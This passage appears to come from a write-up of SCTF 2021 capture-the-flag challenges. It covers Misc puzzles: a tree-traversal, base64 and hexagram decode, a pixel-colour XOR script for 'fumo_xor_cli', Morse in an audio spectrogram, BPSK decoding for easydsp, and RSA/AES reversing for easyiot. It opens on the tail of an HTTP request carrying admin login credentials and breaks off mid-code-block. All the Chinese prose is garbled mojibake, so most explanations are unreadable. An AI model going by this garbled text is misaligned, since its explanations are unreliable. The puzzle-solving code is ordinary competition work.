</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Accept-Encoding: gzip
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{&#34;email&#34;: &#34;admin@foo.org&#34;, &#34;username&#34;: &#34;admin&#34;, &#34;password&#34;: &#34;ahDi3aid&#34;}
</span></span></code></pre></td></tr></table></div></div><h1 id=misc>Misc</h1><h3 id=this_is_a_tree>This_is_A_tree</h3><blockquote><p>ä¸€é¢—åœ£è¯æ ‘ï¼Œè¿˜æœ‰å¥½å¤šç¤¼ç‰©,flagéœ€è¦SCTF{}å™¢ ,a beautiful tree,U need to know some Chinese traditional knowledge,flag need a â€œSCTF{your_flag}â€</p></blockquote><p>éå†bata+base64+ä¸­æ–‡è½¬äºŒè¿›åˆ¶è½¬ascii</p><p>ä¸­åºéå†åçš„å­—ç¬¦ä¸²ä¸ºï¼šQ2hpbmVzZSB0cmFkaXRpb25hbCBjdWx0dXJlIGlzIGJyb2FkIGFuZCBwcm9mb3VuZCEgU28gSSBXYW50IEdpdmUgWW91IE15IEZsYWcgQnV0IFlvdSBOZWVkIERlY29kZSBJdC5FbmpveSBUaGUgRmxhZyEhOuW4iCDlhZEg5aSNIOaNnyDlt70g6ZyHIOaZiyDlp6Qg5aSn6L+HIOiuvCDlmazll5Eg6ZyHIOaBkiDoioIg6LGrIA==</p><p>base64åï¼š</p><p>Chinese traditional culture is broad and profound! So I Want Give You My Flag But You Need Decode It.Enjoy The Flag!!:å¸ˆ å…‘ å¤ æŸ å·½ éœ‡ æ™‹ å§¤ å¤§è¿‡ è®¼ å™¬å—‘ éœ‡ æ’ èŠ‚ è±«</p><p><a href=https://github.com/BjdsecCA/BJDCTF2020_January>https://github.com/BjdsecCA/BJDCTF2020_January</a>å‚è€ƒé‡Œé¢çš„ä¼ç¾²å…­åå››å¦</p><p>ç„¶åä¸­æ–‡è½¬äºŒè¿›åˆ¶ï¼š</p><p>010000110110100000110001011011100100000101011111011110010111100101100100011100110010000100</p><p>äºŒè¿›åˆ¶è½¬å‡ºascii</p><p>Ch1nA_yyds!</p><h3 id=fumo_xor_cli>fumo_xor_cli</h3><blockquote><p>nc 124.70.150.39 2333</p></blockquote><blockquote><p>nc 123.60.107.154 2333</p></blockquote><blockquote><p>FUMOFUMO FUMO FUMOFUMO?(flagä¸­æ²¡æœ‰æ•°å­—)</p></blockquote><p><img src=/img/2021-12-25-SCTF/20211228082941352.jpg alt=img></p><p>Fumo ä¸­é—´å¤¹ç€ä¸¤æ®µå½©è‰²çš„æ–‡å­—ï¼Œå…¶ä¸­ä¸€éƒ¨åˆ†åŒ…å«ä¸€ä¸ªé“¾æ¥</p><p><a href=https://mp.weixin.qq.com/s/E_iDJBkVEC4jZanzvqnWCA>https://mp.weixin.qq.com/s/E_iDJBkVEC4jZanzvqnWCA</a></p><p>é‡Œé¢æœ‰å¼ å›¾</p><p><a href=https://imgtu.com/i/TpMSkq>https://imgtu.com/i/TpMSkq</a></p><p><img src=/img/2021-12-25-SCTF/20211228082945284.jpg alt=img></p><p><img src=/img/2021-12-25-SCTF/1.jpg alt=img></p><p>æŒ‰ç…§é¢˜ç›®åç§°çš„æ„æ€ï¼Œæå–è¿™é‡Œé¢çš„æ¯ä¸ªåƒç´ ç‚¹ï¼Œå’Œ cli é‡Œé¢çš„é‚£ä¸ªè¿›è¡Œå¼‚æˆ–</p><p>å›¾ç‰‡ä¸­ä¸€è¡Œ100ä¸ª æ€»å…± 13300 ä¸ªè‰²å—</p><p><img src=/img/2021-12-25-SCTF/20211228082941059.jpg alt=img></p><p>Shell é‡Œæ‹¿ pwntools æ¥æ”¶ æå–å‡ºæ¥æœ‰ 6650 ä¸ªå­—ç¬¦ï¼Œæ­£å¥½2å€</p><p><img src=/img/2021-12-25-SCTF/20211228082943505.jpg alt=img></p><p>å›¾é‡Œè¿™ä¸ªé¡ºåºæ­£å¥½å’Œshellé‡Œç¬¬äºŒæ®µäº”é¢œå…­è‰²çš„å­—ç¬¦é¢œè‰²é¡ºåºä¸€æ ·ï¼Œå¼‚æˆ–ä¹‹åå‘ç°å‰6650ä½å‡ ä¹å®Œå…¨ä¸€è‡´ï¼Œåé¢ä¸ä¸€æ ·</p><p>åé¢é‚£ä¸€åŠå’Œ cli å‰é¢é‚£éƒ¨åˆ†å½©è‰²çš„é¢œè‰²ï¼ˆaaaaa&mldr;.ï¼‰æ¥å¼‚æˆ–</p><p>Exp:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=c1># MiaoTony</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># from pwn import *</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># host = &#39;124.70.150.39&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># port = 2333</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># r = remote(host, port)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># s = r.recvall()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># print(s[:100])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># print(s[-100:])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># with open(&#39;data&#39;, &#39;wb&#39;) as f:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#     f.write(s)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s1>&#39;TpMSkq.png&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># img.show()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>img</span><span class=o>.</span><span class=n>size</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># (900, 1200)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># çºµå‘æ¥æå–</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>img</span><span class=o>.</span><span class=n>size</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>9</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>img</span><span class=o>.</span><span class=n>size</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>-</span><span class=mi>9</span><span class=p>,</span> <span class=mi>9</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=p>,</span> <span class=n>g</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>a</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=p>,</span> <span class=n>g</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>data</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>r</span><span class=p>,</span> <span class=n>g</span><span class=p>,</span> <span class=n>b</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># print(data)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 13300</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;colors2&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>data</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;data2.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;data1.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>+=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># print(s)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># s[:100]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>l</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x1b</span><span class=s1>\[38;2;(\d+);(\d+);(\d+)m&#39;</span><span class=p>,</span> <span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># print(l)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>colors</span> <span class=o>=</span> <span class=p>[</span><span class=nb>tuple</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>j</span><span class=p>)</span> <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=n>l</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>colors</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 6650</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>data_new</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>colors</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>tmp</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>]</span> <span class=o>^</span> <span class=n>colors</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>x</span> <span class=o>+=</span> <span class=p>(</span><span class=n>tmp</span><span class=p>,)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data_new</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;data_xor.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>data_new</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>img1</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s1>&#39;RGB&#39;</span><span class=p>,</span> <span class=p>(</span><span class=mi>133</span><span class=p>,</span> <span class=mi>100</span><span class=p>),</span> <span class=p>(</span><span class=mi>255</span><span class=p>,</span> <span class=mi>255</span><span class=p>,</span> <span class=mi>255</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>img1</span><span class=o>.</span><span class=n>putdata</span><span class=p>(</span><span class=n>data_new</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>img1</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=s1>&#39;out.png&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>img1</span><span class=o>.</span><span class=n>show</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2021-12-25-SCTF/20211228082940663.jpg alt=img></p><p>ç¿»è½¬æ—‹è½¬ä¸€ä¸‹å¾—åˆ° flag</p><p>SCTF{Good_FuMo_CTF_OvO}</p><h3 id=in_the_vaporwaves>in_the_vaporwaves</h3><blockquote><p>something in the vaporwaves(é¢˜ç›®flagæ ¼å¼ä¸º SCTF(.<em>) è¯·è‡ªè¡ŒåŠ ä¸ŠèŠ±æ‹¬å·ä¸º SCTF{.</em>} æäº¤)</p></blockquote><blockquote><p>é™„ä»¶é“¾æ¥ï¼šhttps://pan.baidu.com/s/1W9RISgb8O7WxX_P09IiEpA</p></blockquote><blockquote><p>æå–ç ï¼šsctf</p></blockquote><p><img src=/img/2021-12-25-SCTF/20211228082942056.jpg alt=img></p><p>ä¿®æ”¹é¢‘è°±å¤§ä¸€ç‚¹ moseè§£å¯†</p><p><img src=/img/2021-12-25-SCTF/20211228082941119.jpg alt=img></p><h3 id=easydsp>easydsp</h3><p>é¢˜ç›®é™„ä»¶åŒ…å« 4 ä¸ªæ•°æ®æ–‡ä»¶ï¼Œæ¯ä¸ªæ•°æ®æ–‡ä»¶ä¸º 126000 ä¸ªæµ®ç‚¹æ•°ã€‚å‚è€ƒé¢˜ç›®æè¿°ï¼Œå°†æ•°æ®æ–‡ä»¶æŒ‰ç…§éŸ³é¢‘æ–‡ä»¶ç†è§£ï¼Œè½¬æ¢ä¸º wav ï¼ˆé€‚å½“å‹ç¼©å¹…åº¦ï¼‰ï¼Œå¯ä»¥å¬åˆ°å››æ®µéŸ³ä¹æ··åˆä¸åŒç±»å‹çš„æ‚éŸ³ã€‚è€ƒè™‘åˆ°æ ·æœ¬ç‚¹å¹…åº¦è¶…è¿‡äº† -1 ~ 1 çš„èŒƒå›´ï¼ŒçŒœæµ‹å‡ºé¢˜äººå¯èƒ½å°†ä¸¤æ®µéŸ³é¢‘æ–‡ä»¶ç›´æ¥åŠ åœ¨äº†ä¸€èµ·ï¼Œå› æ­¤å°è¯•äº†ä¸€ä¸‹è®¡ç®— data1 - data2 çš„ç»“æœï¼Œç”»å›¾å¦‚ä¸‹</p><p><img src=/img/2021-12-25-SCTF/20211228082941973.jpg alt=img></p><p>å¯ä»¥ä»å·®å€¼ä¸­çœ‹å‡ºé‡‡ç”¨äº†ç±»ä¼¼ BPSK è°ƒåˆ¶æ–¹å¼è¿›è¡Œç¼–ç ï¼Œå‘¨æœŸä¸º 1000 ä¸ªé‡‡æ ·ç‚¹ã€‚å®Œæ•´çš„æ–‡ä»¶å¯ä»¥ç¼–ç  126 bit å†…å®¹ã€‚126 ä¸æ˜¯ 8 çš„å€æ•°ï¼Œæ˜¯ 7 çš„å€æ•°ï¼ŒçŒœæµ‹æœ‰å¯èƒ½æ˜¯ä½¿ç”¨ 7bit ç¼–ç ä¸€ä¸ªå­—ç¬¦çš„æ–¹å¼ã€‚ä¸€äº›å°è¯•åå¯è¿˜åŸå‡º flag çš„å†…å®¹ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>5</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>(</span><span class=nb>list</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=nb>float</span><span class=p>,</span> <span class=nb>open</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;data</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s1>.txt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>splitlines</span><span class=p>()))))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>diff</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>-</span> <span class=n>data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_bit</span><span class=p>(</span><span class=n>x</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1</span> <span class=k>if</span> <span class=n>np</span><span class=o>.</span><span class=n>sum</span><span class=p>(</span><span class=n>x</span><span class=p>[</span><span class=mi>200</span><span class=p>:</span><span class=mi>300</span><span class=p>])</span> <span class=o>/</span> <span class=mi>100</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=k>else</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>bits</span> <span class=o>=</span> <span class=p>[</span><span class=n>get_bit</span><span class=p>(</span><span class=n>diff</span><span class=p>[</span><span class=n>d</span><span class=p>:</span><span class=n>d</span> <span class=o>+</span> <span class=mi>1000</span><span class=p>])</span> <span class=k>for</span> <span class=n>d</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>126000</span><span class=p>,</span> <span class=mi>1000</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>bits</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>t</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>bits</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=p>(</span><span class=n>t</span> <span class=o>&lt;&lt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>bits</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>i</span> <span class=o>%</span> <span class=mi>7</span> <span class=o>==</span> <span class=mi>6</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>flag</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>t</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>t</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>repr</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>flag</span><span class=p>)))</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=easyiot>easyiot</h3><p>é¢˜ç›®ç»™äº†ä¸€ä¸ªç”¨æˆ·ç¨‹åºã€ä¸€ä¸ªåŠ å¯†åçš„æ–‡ä»¶å’Œä¸€ä¸ªå†…æ ¸æ¨¡å—ã€‚ç”¨æˆ·ç¨‹åºæŠŠä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼ˆdevice_tree.txtï¼‰é€å­—ç¬¦ RSA åŠ å¯†è¾“å‡ºã€‚ç”±äºåŠ å¯†æ–¹å¼æ˜¯ä¸€ä¸€æ˜ å°„ï¼Œå¯ä»¥é€šè¿‡åŠ å¯†åç»“æœå‡ºç°çš„é¢‘ç‡ä¸å­—ç¬¦å‡ºç°é¢‘ç‡å¯¹ç…§å¤§å¤§ç¼©å°çˆ†ç ´çš„ç©ºé—´ï¼Œæ­¤å¤„å¯é€šè¿‡çˆ†ç ´çš„æ–¹å¼å¾—åˆ° RSA çš„å‚æ•° (n = 391, d = 305)ï¼Œä¸è¿‡è¿™ä¸ªå‚æ•°å®é™…ä¸Šåœ¨å†…æ ¸æ¨¡å—ä¸­ä¹Ÿæœ‰ï¼Œä¸éœ€è¦çˆ†ç ´ã€‚ã€‚å¾—åˆ°å‚æ•°åè§£å¯† device_tree.txt å†…å®¹å¦‚ä¸‹</p><blockquote><p>Congratulations on helping B find the device tree plug-in,Here are some tips, Embedded Engineer A, wants to send a message requesting a connection to the server using an IoT device Distribute up to once, and the server clears the session after it receives it, and the server kicks the device off after more than 2 minutes of idleness.This message appears on the screen of the IoT device (read as normal) Can you get the data that A enters into the IoT device? (Remember to put &ldquo;sctf{}&rdquo; on it)</p></blockquote><p>é€†å‘å†…æ ¸æ¨¡å—é€»è¾‘å¯å¾— user password å†…å®¹ä¸º <code>chengdu106520013</code> ï¼ˆAES è§£å¯†ï¼‰ï¼Œä»¥åŠä¸€ä¸ªæ¯”è¾ƒæ­£å¸¸çš„ LED æ˜¾ç¤ºè¾“å‡ºçš„é€»è¾‘ï¼ˆå¯ä»¥ä» <a href=https://github.com/Embedfire/embed_linux_tutorial/tree/master/base_code/linux_driver/ecSPI_OLED>https://github.com/Embedfire/embed_linux_tutorial/tree/master/base_code/linux_driver/ecSPI_OLED</a> æ‰¾åˆ°ä¿®æ”¹å‰çš„æºç ï¼‰ã€‚</p><p>ä»…é€šè¿‡ device_tree.txt çš„å†…å®¹æ²¡æœ‰è„‘æ´å‡ºæ¥è¿™äº›å’Œ flag çš„å…³ç³»æ˜¯æ€æ ·çš„ã€‚ã€‚ã€‚åœ¨çœ‹åˆ° hint ç»™å‡ºçš„ message ä¹‹åï¼Œå¯ä»¥çœ‹åˆ° MQTT ç›¸å…³çš„ä¿¡æ¯ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯æƒ³æŠŠ MQTT æŠ¥æ–‡å†…å®¹ä½œä¸º flag æäº¤ã€‚åœ¨ä¸€ç•ªä¸å‡ºé¢˜äººç¡®è®¤ä¿¡æ¯åï¼ˆæ¯”å¦‚ç›¸æ¯”æ ‡å‡†åè®®å°‘æ‰ä¸€ä¸ªå­—èŠ‚æ˜¯ä»€ä¹ˆæƒ…å†µï¼‰ï¼Œåˆæ³¨æ„åˆ° LED è¾“å‡ºçš„éƒ¨åˆ†æ’åºæ–¹å¼ä¸æ­£å¸¸ä¸å¤ªä¸€æ ·ï¼Œé©±åŠ¨ä¸­å®ç°çš„æ˜¯é€åˆ—è¾“å‡ºï¼Œå¦‚æœæƒ³â€œæ­£å¸¸è¯»å‡ºâ€çš„è¯éœ€è¦åšè½¬ç½®ã€‚å¤šæ¬¡å°è¯•åç»ˆäºæ‹¼å‡ºäº†æ­£ç¡®çš„ flagã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
